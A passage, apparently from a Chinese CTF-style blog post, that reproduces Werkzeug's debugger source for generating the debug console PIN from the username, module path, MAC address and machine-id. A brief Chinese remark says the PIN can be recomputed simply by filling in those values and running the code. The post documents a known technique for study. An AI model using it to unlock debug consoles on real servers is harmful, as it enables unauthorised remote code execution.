string">"__module__"</span><span class="token punctuation">,</span> t<span class="token punctuation">.</span>cast<span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">,</span> app<span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__module__<span class="token punctuation">)</span>    username<span class="token punctuation">:</span> t<span class="token punctuation">.</span>Optional<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token comment"># getuser imports the pwd module, which does not exist in Google</span>        <span class="token comment"># App Engine. It may also raise a KeyError if the UID does not</span>        <span class="token comment"># have a username, such as in Docker.</span>        username <span class="token operator">=</span> getpass<span class="token punctuation">.</span>getuser<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> <span class="token punctuation">(</span>ImportError<span class="token punctuation">,</span> KeyError<span class="token punctuation">)</span><span class="token punctuation">:</span>        username <span class="token operator">=</span> <span class="token boolean">None</span>    mod <span class="token operator">=</span> sys<span class="token punctuation">.</span>modules<span class="token punctuation">.</span>get<span class="token punctuation">(</span>modname<span class="token punctuation">)</span>    <span class="token comment"># This information only exists to make the cookie unique on the</span>    <span class="token comment"># computer, not as a security feature.</span>    probably_public_bits <span class="token operator">=</span> <span class="token punctuation">[</span>        username<span class="token punctuation">,</span>        modname<span class="token punctuation">,</span>        <span class="token builtin">getattr</span><span class="token punctuation">(</span>app<span class="token punctuation">,</span> <span class="token string">"__name__"</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token punctuation">(</span>app<span class="token punctuation">)</span><span class="token punctuation">.</span>__name__<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token builtin">getattr</span><span class="token punctuation">(</span>mod<span class="token punctuation">,</span> <span class="token string">"__file__"</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">]</span>    <span class="token comment"># This information is here to make it harder for an attacker to</span>    <span class="token comment"># guess the cookie name.  They are unlikely to be contained anywhere</span>    <span class="token comment"># within the unauthenticated debug page.</span>    private_bits <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>uuid<span class="token punctuation">.</span>getnode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> get_machine_id<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    h <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha1<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> bit <span class="token keyword">in</span> chain<span class="token punctuation">(</span>probably_public_bits<span class="token punctuation">,</span> private_bits<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> bit<span class="token punctuation">:</span>            <span class="token keyword">continue</span>        <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>bit<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            bit <span class="token operator">=</span> bit<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>        h<span class="token punctuation">.</span>update<span class="token punctuation">(</span>bit<span class="token punctuation">)</span>    h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b"cookiesalt"</span><span class="token punctuation">)</span>    cookie_name <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"__wzd</span><span class="token interpolation"><span class="token punctuation">&#123;</span>h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token format-spec">20]</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>    <span class="token comment"># If we need to generate a pin we salt it a bit more so that we don't</span>    <span class="token comment"># end up with the same value and generate out 9 digits</span>    <span class="token keyword">if</span> num <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b"pinsalt"</span><span class="token punctuation">)</span>        num <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">int</span><span class="token punctuation">(</span>h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token format-spec">09d</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">]</span>    <span class="token comment"># Format the pincode in groups of digits for easier remembering if</span>    <span class="token comment"># we don't have a result yet.</span>    <span class="token keyword">if</span> rv <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> group_size <span class="token keyword">in</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">%</span> group_size <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>                rv <span class="token operator">=</span> <span class="token string">"-"</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>                    num<span class="token punctuation">[</span>x <span class="token punctuation">:</span> x <span class="token operator">+</span> group_size<span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span>group_size<span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span>                    <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">,</span> group_size<span class="token punctuation">)</span>                <span class="token punctuation">)</span>                <span class="token keyword">break</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            rv <span class="token operator">=</span> num    <span class="token keyword">return</span> rv<span class="token punctuation">,</span> cookie_name<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> 返回的rv就是PIN码，但这个函数核心是将列表里的值hash，我们不需要去读懂这段代码，只需要将列表里的值填上直接运行代码就行。 </p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> getpass<span class="token keyword">import</span> hashlib<span class="token keyword">import</span> json<span class="token keyword">import</span> os<span class="token keyword">import</span> pkgutil<span class="token keyword">import</span> re<span class="token keyword">import</span> sys<span class="token keyword">import</span> time<span class="token keyword">import</span> typing <span class="token keyword">as</span> t<span class="token keyword">import</span> uuid<span class="token keyword">from</span> contextlib <span class="token keyword">import</span> ExitStack<span class="token keyword">from</span> contextlib <span class="token keyword">import</span> nullcontext<span class="token keyword">from</span> io <span class="token keyword">import</span> BytesIO<span class="token keyword">from</span> itertools <span class="token keyword">import</span> chain<span class="token keyword">from</span> os<span class="token punctuation">.</span>path <span class="token keyword">import</span> basename<span class="token keyword">from</span> os<span class="token punctuation">.</span>path <span class="token keyword">import</span> join<span class="token keyword">from</span> zlib <span class="token keyword">import</span> adler32<span class="token keyword">from</span> <span class="token punctuation">.</span><span class="token punctuation">.</span>_internal <span class="token keyword">import</span> _log<span class="token keyword">from</span> <span class="token punctuation">.</span><span class="token punctuation">.</span>exceptions <span class="token keyword">import</span> NotFound<span class="token keyword">from</span> <span class="token punctuation">.</span><span class="token punctuation">.</span>http <span class="token keyword">import</span> parse_cookie<span class="token keyword">from</span> <span class="token punctuation">.</span><span class="token punctuation">.</span>security <span class="token keyword">import</span> gen_salt<span class="token keyword">from</span> <span class="token punctuation">.</span><span class="token punctuation">.</span>utils <span class="token keyword">import</span> send_file<span class="token keyword">from</span> <span class="token punctuation">.</span><span class="token punctuation">.</span>wrappers<span class="token punctuation">.</span>request <span class="token keyword">import</span> Request<span class="token keyword">from</span> <span class="token punctuation">.</span><span class="token punctuation">.</span>wrappers<span class="token punctuation">.</span>response <span class="token keyword">import</span> Response<span class="token keyword">from</span> <span class="token punctuation">.</span>console <span class="token keyword">import</span> Console<span class="token keyword">from</span> <span class="token punctuation">.</span>tbtools <span class="token keyword">import</span> DebugFrameSummary<span class="token keyword">from</span> <span class="token punctuation">.</span>tbtools <span class="token keyword">import</span> DebugTraceback<span class="token keyword">from</span> <span class="token punctuation">.</span>tbtools <span class="token keyword">import</span> render_console_html<span class="token keyword">if</span> t<span class="token punctuation">.</span>TYPE_CHECKING<span class="token punctuation">:</span>    <span class="token keyword">from</span> _typeshed<span class="token punctuation">.</span>wsgi <span class="token keyword">import</span> StartResponse    <span class="token keyword">from</span> _typeshed<span class="token punctuation">.</span>wsgi <span class="token keyword">import</span> WSGIApplication    <span class="token keyword">from</span> _typeshed<span class="token punctuation">.</span>wsgi <span class="token keyword">import</span> WSGIEnvironment<span class="token comment"># A week</span>PIN_TIME <span class="token operator">=</span> <span class="token number">60</span> <span class="token operator">*</span> <span class="token number">60</span> <span class="token operator">*</span> <span class="token number">24</span> <span class="token operator">*</span> <span class="token number">7</span><span class="token keyword">def</span> <span class="token function">hash_pin</span><span class="token punctuation">(</span>pin<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> hashlib<span class="token punctuation">.</span>sha1<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>pin<span class="token punctuation">&#125;</span></span><span class="token string"> added salt"</span></span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">,</span> <span class="token string">"replace"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">12</span><span class="token punctuation">]</span>_machine_id<span class="token punctuation">:</span> t<span class="token punctuation">.</span>Optional<span class="token punctuation">[</span>t<span class="token punctuation">.</span>Union<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">None</span><span class="token keyword">def</span> <span class="token function">get_machine_id</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> t<span class="token punctuation">.</span>Optional<span class="token punctuation">[</span>t<span class="token punctuation">.</span>Union<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> _machine_id    <span class="token keyword">if</span> _machine_id <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> _machine_id    <span class="token keyword">def</span> <span class="token function">_generate</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> t<span class="token punctuation">.</span>Optional<span class="token punctuation">[</span>t<span class="token punctuation">.</span>Union<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        linux <span class="token operator">=</span> <span class="token string">b""</span>        <span class="token comment"># machine-id is stable across boots, boot_id is not.</span>        <span class="token keyword">for</span> filename <span class="token keyword">in</span> <span class="token string">"/etc/machine-id"</span><span class="token punctuation">,</span> <span class="token string">"/proc/sys/kernel/random/boot_id"</span><span class="token punctuation">:</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>                    value <span class="token operator">=</span> f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">except</span> OSError<span class="token punctuation">:</span>                <span class="token keyword">continue</span>            <span class="token keyword">if</span> value<span class="token punctuation">:</span>                linux <span class="token operator">+=</span> value                <span class="token keyword">break</span> <span class="token comment">#有个break</span>        <span class="token comment"># Containers share the same machine id, add some cgroup</span>        <span class="token comment"># information. This is used outside containers too but should be</span>        <span class="token comment"># relatively stable across boots.</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/proc/self/cgroup"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>                linux <span class="token operator">+=</span> f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rpartition<span class="token punctuation">(</span><span class="token string">b"/"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>        <span class="token keyword">except</span> OSError<span class="token punctuation">:</span>            <span class="token keyword">pass</span>        <span class="token keyword">if</span> linux<span class="token punctuation">:</span>            <span class="token keyword">return</span> linux        <span class="token comment"># On OS X, use ioreg to get the computer's serial number.</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token comment"># subprocess may not be available, e.g. Google App Engine</span>            <span class="token comment"># https://github.com/pallets/werkzeug/issues/925</span>            <span class="token keyword">from</span> subprocess <span class="token keyword">import</span> Popen<span class="token punctuation">,</span> PIPE            dump <span class="token operator">=</span> Popen<span class="token punctuation">(</span>                <span class="token punctuation">[</span><span class="token string">"ioreg"</span><span class="token punctuation">,</span> <span class="token string">"-c"</span><span class="token punctuation">,</span> <span class="token string">"IOPlatformExpertDevice"</span><span class="token punctuation">,</span> <span class="token string">"-d"</span><span class="token punctuation">,</span> <span class="token string">"2"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span>PIPE            <span class="token punctuation">)</span><span class="token punctuation">.</span>communicate<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>            <span class="token keyword">match</span> <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'"serial-number" = &lt;([^>]+)'</span><span class="token punctuation">,</span> dump<span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token keyword">match</span> <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">except</span> <span class="token punctuation">(</span>OSError<span class="token punctuation">,</span> ImportError<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">pass</span>        <span class="token comment"># On Windows, use winreg to get the machine guid.</span>        <span class="token keyword">if</span> sys<span class="token punctuation">.</span>platform <span class="token operator">==</span> <span class="token string">"win32"</span><span class="token punctuation">:</span>            <span class="token keyword">import</span> winreg            <span class="token keyword">try</span><span class="token punctuation">:</span>                <span class="token keyword">with</span> winreg<span class="token punctuation">.</span>OpenKey<span class="token punctuation">(</span>                    winreg<span class="token punctuation">.</span>HKEY_LOCAL_MACHINE<span class="token punctuation">,</span>                    <span class="token string">"SOFTWARE\\Microsoft\\Cryptography"</span><span class="token punctuation">,</span>                    <span class="token number">0</span><span class="token punctuation">,</span>                    winreg<span class="token punctuation">.</span>KEY_READ <span class="token operator">|</span> winreg<span class="token punctuation">.</span>KEY_WOW64_64KEY<span class="token punctuation">,</span>                <span class="token punctuation">)</span> <span class="token keyword">as</span> rk<span class="token punctuation">:</span>                    guid<span class="token punctuation">:</span> t<span class="token punctuation">.</span>Union<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">]</span>                    guid_type<span class="token punctuation">:</span> <span class="token builtin">int</span>                    guid<span class="token punctuation">,</span> guid_type <span class="token operator">=</span> winreg<span class="token punctuation">.</span>QueryValueEx<span class="token punctuation">(</span>rk<span class="token punctuation">,</span> <span class="token string">"MachineGuid"</span><span class="token punctuation">)</span>                    <span class="token keyword">if</span> guid_type <span class="token operator">==</span> winreg<span class="token punctuation">.</span>REG_SZ<span class="token punctuation">:</span>                        <span class="token keyword">return</span> guid<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>                    <span class="token keyword">return</span> guid            <span class="token keyword">except</span> OSError<span class="token punctuation">:</span>                <span class="token keyword">pass</span>        <span class="token keyword">return</span> <span class="token boolean">None</span>    _machine_id <span class="token operator">=</span> _generate<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> _machine_id<span class="token keyword">class</span> <span class="token class-name">_ConsoleFrame</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Helper class so that we can reuse the frame console code for the    standalone console.    """</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> namespace<span class="token punctuation">:</span> t<span class="token punctuation">.</span>Dict<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> t<span class="token punctuation">.</span>Any<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>console <span class="token operator">=</span> Console<span class="token punctuation">(</span>namespace<span class="token punctuation">)</span>        self<span class="token punctuation">.</span><span class="token builtin">id</span> <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">def</span> <span class="token function">eval</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> code<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> t<span class="token punctuation">.</span>Any<span class="token punctuation">:</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>console<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_pin_and_cookie_name</span><span class="token punctuation">(</span>    app<span class="token punctuation">:</span> <span class="token string">"WSGIApplication"</span><span class="token punctuation">,</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> t<span class="token punctuation">.</span>Union<span class="token punctuation">[</span>t<span class="token punctuation">.</span>Tuple<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">]</span><span class="token punctuation">,</span> t<span class="token punctuation">.</span>Tuple<span class="token punctuation">[</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Given an application object this returns a semi-stable 9 digit pin    code and a random key.  The hope is that this is stable between    restarts to not make debugging particularly frustrating.  If the pin    was forcefully disabled this returns `None`.    Second item in the resulting tuple is the cookie name for remembering.    """</span>    pin <span class="token operator">=</span> os<span class="token punctuation">.</span>environ<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"WERKZEUG_DEBUG_PIN"</span><span class="token punctuation">)</span>    rv <span class="token operator">=</span> <span class="token boolean">None</span>    num <span class="token operator">=</span> <span class="token boolean">None</span>    <span class="token comment"># Pin was explicitly disabled</span>    <span class="token keyword">if</span> pin <span class="token operator">==</span> <span class="token string">"off"</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span>    <span class="token comment"># Pin was provided explicitly</span>    <span class="token keyword">if</span> pin <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span> <span class="token keyword">and</span> pin<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"-"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>isdecimal<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment"># If there are separators in the pin, return it directly</span>        <span class="token keyword">if</span> <span class="token string">"-"</span> <span class="token keyword">in</span> pin<span class="token punctuation">:</span>            rv <span class="token operator">=</span> pin        <span class="token keyword">else</span><span class="token punctuation">:</span>            num <span class="token operator">=</span> pin    modname <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>app<span class="token punctuation">,</span> <span class="token string">"__module__"</span><span class="token punctuation">,</span> t<span class="token punctuation">.</span>cast<span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">,</span> app<span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__module__<span class="token punctuation">)</span>    username<span class="token punctuation">:</span> t<span class="token punctuation">.</span>Optional<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token comment"># getuser imports the pwd module, which does not exist in Google</span>        <span class="token comment"># App Engine. It may also raise a KeyError if the UID does not</span>        <span class="token comment"># have a username, such as in Docker.</span>        username <span class="token operator">=</span> getpass<span class="token punctuation">.</span>getuser<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> <span class="token punctuation">(</span>ImportError<span class="token punctuation">,</span> KeyError<span class="token punctuation">)</span><span class="token punctuation">:</span>        username <span class="token operator">=</span> <span class="token boolean">None</span>    mod <span class="token operator">=</span> sys<span class="token punctuation">.</span>modules<span class="token punctuation">.</span>get<span class="token punctuation">(</span>modname<span class="token punctuation">)</span>    <span class="token comment"># This information only exists to make the cookie unique on the</span>    <span class="token comment"># computer, not as a security feature.</span>    probably_public_bits <span class="token operator">=</span> <span class="token punctuation">[</span>        username<span class="token punctuation">,</span>        modname<span class="token punctuation">,</span>        <span class="token builtin">getattr</span><span class="token punctuation">(</span>app<span class="token punctuation">,</span> <span class="token string">"__name__"</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token punctuation">(</span>app<span class="token punctuation">)</span><span class="token punctuation">.</span>__name__<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token builtin">getattr</span><span class="token punctuation">(</span>mod<span class="token punctuation">,</span> <span class="token string">"__file__"</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">]</span>    <span class="token comment"># This information is here to make it harder for an attacker to</span>    <span class="token comment"># guess the cookie name.  They are unlikely to be contained anywhere</span>    <span class="token comment"># within the unauthenticated debug page.</span>    private_bits <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>uuid<span class="token punctuation">.</span>getnode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> get_machine_id<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    h <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha1<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> bit <span class="token keyword">in</span> chain<span class="token punctuation">(</span>probably_public_bits<span class="token punctuation">,</span> private_bits<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> bit<span class="token punctuation">:</span>            <span class="token keyword">continue</span>        <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>bit<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            bit <span class="token operator">=</span> bit<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>        h<span class="token punctuation">.</span>update<span class="token punctuation">(</span>bit<span class="token punctuation">)</span>    h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b"cookiesalt"</span><span class="token punctuation">)</span>    cookie_name <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"__wzd</span><span class="token interpolation"><span class="token punctuation">&#123;</span>h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token format-spec">20]</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>    <span class="token comment"># If we need to generate a pin we salt it a bit more so that we don't</span>    <span class="token comment"># end up with the same value and generate out 9 digits</span>    <span class="token keyword">if</span> num <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b"pinsalt"</span><span class="token punctuation">)</span>        num <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">int</span><span class="token punctuation">(</span>h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token format-spec">09d</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">]</span>    <span class="token comment"># Format the pincode in groups of digits for easier remembering if</span>    <span class="token comment"># we don't have a result yet.</span>    <span class="token keyword">if</span> rv <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> group_size <span class="token keyword">in</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">%</span> group_size <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>                rv <span class="token operator">=</span> <span class="token string">"-"</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>                    num<span class="token punctuation">[</span>x <span class="token punctuation">:</span> x <span class="token operator">+</span> group_size<span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span>group_size<span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span>                    <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">,</span> group_size<span class="token punctuation">)</span>                <span class="token punctuation">)</span>                <span class="token keyword">break</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            rv <span class="token operator">=</span> num    <span class="token keyword">return</span> rv<span class="token punctuation">,</span> cookie_name<span class="token keyword">class</span> <span class="token class-name">DebuggedApplication</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Enables debugging support for a given application::        from werkzeug.debug import DebuggedApplication        from myapp import app        app = DebuggedApplication(app, evalex=True)    The ``evalex`` argument allows evaluating expressions in any frame    of a traceback. This works by preserving each frame with its local    state. Some state, such as :doc:`local`, cannot be restored with the    frame by default. When ``evalex`` is enabled,    ``environ["werkzeug.debug.preserve_context"]`` will be a callable    that takes a context manager, and can be called multiple times.    Each context manager will be entered before evaluating code in the    frame, then exited again, so they can perform setup and cleanup for    each call.    :param app: the WSGI application to run debugged.    :param evalex: enable exception evaluation feature (interactive                   debugging).  This requires a non-forking server.    :param request_key: The key that points to the request object in this                        environment.  This parameter is ignored in current                        versions.    :param console_path: the URL for a general purpose console.    :param console_init_func: the function that is executed before starting                              the general purpose console.  The return value                              is used as initial namespace.    :param show_hidden_frames: by default hidden traceback frames are skipped.                               You can show them by setting this parameter                               to `True`.    :param pin_security: can be used to disable the pin based security system.    :param pin_logging: enables the logging of the pin system.    .. versionchanged:: 2.2        Added the ``werkzeug.debug.preserve_context`` environ key.    """</span>    _pin<span class="token punctuation">:</span> <span class="token builtin">str</span>    _pin_cookie<span class="token punctuation">:</span> <span class="token builtin">str</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>        self<span class="token punctuation">,</span>        app<span class="token punctuation">:</span> <span class="token string">"WSGIApplication"</span><span class="token punctuation">,</span>        evalex<span class="token punctuation">:</span> <span class="token builtin">bool</span> <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">,</span>        request_key<span class="token punctuation">:</span> <span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"werkzeug.request"</span><span class="token punctuation">,</span>        console_path<span class="token punctuation">:</span> <span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"/console"</span><span class="token punctuation">,</span>        console_init_func<span class="token 